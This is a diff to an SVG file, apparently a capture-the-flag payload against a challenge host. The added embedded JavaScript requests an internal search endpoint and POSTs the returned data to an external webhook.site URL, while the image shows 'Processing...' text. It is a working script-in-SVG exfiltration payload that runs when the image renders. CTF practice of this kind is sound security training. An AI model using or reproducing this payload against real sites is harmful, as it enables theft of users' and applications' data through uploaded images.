@@ -1,11 +1,33 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
   <script type="text/javascript">
-    <![CDATA[
-      fetch('https://webhook.site/2da59de9-f710-42f5-9dab-fb66e65aca21')
-        .then(response => response.text())
-        .then(data => console.log(data));
-    ]]>
+    // Make the internal request
+    fetch('http://challs.pwny.shellmates.club:1303/search?q=payload.svg')
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.json();
+      })
+      .then(data => {
+        // Send the result to the webhook
+        return fetch('https://webhook.site/2da59de9-f710-42f5-9dab-fb66e65aca21', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ data: data })
+        });
+      })
+      .then(webhookResponse => {
+        if (!webhookResponse.ok) {
+          throw new Error('Failed to send data to webhook');
+        }
+        console.log('Data sent to webhook successfully');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
   </script>
-  <circle cx="50" cy="50" r="40" fill="blue"/>
+  <text x="10" y="20" font-family="Verdana" font-size="20" fill="black">Processing...</text>
 </svg>
 
